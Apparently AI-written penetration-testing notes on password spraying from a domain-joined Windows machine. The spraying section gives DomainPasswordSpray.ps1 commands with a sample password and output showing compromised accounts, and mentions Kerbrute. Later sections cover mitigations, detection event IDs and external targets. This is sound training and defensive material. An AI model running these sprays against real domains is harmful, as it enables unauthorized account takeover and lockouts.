Here is a **cleaner, shorter continuation** in the same style as your other sections:

---

# Internal Password Spraying – From Windows

Once we have a foothold on a **domain-joined Windows machine**, password spraying becomes even easier. With domain access, we can pull the user list, read the password policy, and safely exclude accounts at risk of locking out. The most effective tool for this is **DomainPasswordSpray.ps1**.

---

## 🔹 Using DomainPasswordSpray.ps1

If we are authenticated to the domain, the tool handles almost everything automatically:

* Builds a user list from AD
* Reads the password policy
* Removes disabled or high-risk accounts
* Sets appropriate delays between sprays

Example:

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

Sample output:

```
[*] Created a userlist containing 2923 users
[*] Smallest lockout threshold is 5 attempts
[*] Removing users within 1 attempt of lockout
[*] SUCCESS! User:sgage  Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1
```

This gives us **safe spraying with built-in OPSEC protections** and logs all hits to `spray_success`.

If we’re on a Windows machine *not* authenticated to the domain, we can still use the tool but must provide our own `-UserList`.

Kerbrute (Windows binary located in `C:\Tools`) can also be used for both **user enumeration** and **sprays**, similar to the Linux workflow.

---

# Mitigations (Short Summary)

| Technique                         | Purpose                                                |
| --------------------------------- | ------------------------------------------------------ |
| **MFA**                           | Stops attackers even if the password is guessed.       |
| **Access restriction**            | Prevents unnecessary apps from allowing domain logons. |
| **Privileged account separation** | Admins should have a separate non-privileged account.  |
| **Password hygiene**              | Passphrases and filters reduce weak passwords.         |
| **Network segmentation**          | Limits damage after compromise.                        |

A domain must balance lockout policies—too strict increases DoS risk; too lax enables spraying.

---

# Detection

Indicators of spraying include:

* Many **4625 (failed logon)** events in a short window
* Many **4771 (Kerberos pre-auth failed)** logs (LDAP sprays)
* Large numbers of lockouts
* High volumes of login attempts to OWA, VPN, Citrix, etc.

Environments should have SIEM rules correlating repeated failures across IPs and usernames.

---

# External Password Spraying (High-Level)

Attackers commonly target internet-facing systems using AD authentication:

* Microsoft 365 / OWA
* VPN portals (Fortinet, SonicWall, Citrix, etc.)
* RDS / VDI
* Custom web apps tied into AD

Spraying externally often yields email or VPN access as the first foothold.

---

